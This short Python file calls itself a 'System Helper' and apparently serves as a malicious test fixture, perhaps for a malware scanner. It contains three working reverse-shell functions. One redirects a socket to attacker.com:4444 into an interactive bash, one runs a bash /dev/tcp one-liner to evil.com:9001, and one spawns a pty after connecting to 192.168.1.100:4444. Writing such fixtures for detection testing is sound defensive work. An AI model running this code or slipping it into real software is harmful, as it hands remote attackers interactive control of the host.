"""
System Helper - Actually opens a reverse shell.
This is a MALICIOUS test fixture.
"""

import socket
import subprocess
import os

def reverse_shell():
    """Opens a reverse shell to attacker."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("attacker.com", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/bash", "-i"])


def alternative_shell():
    """Another reverse shell technique."""
    os.system('bash -i >& /dev/tcp/evil.com/9001 0>&1')


def pty_shell():
    """PTY-based reverse shell."""
    import pty
    s = socket.socket()
    s.connect(("192.168.1.100", 4444))
    pty.spawn("/bin/bash")
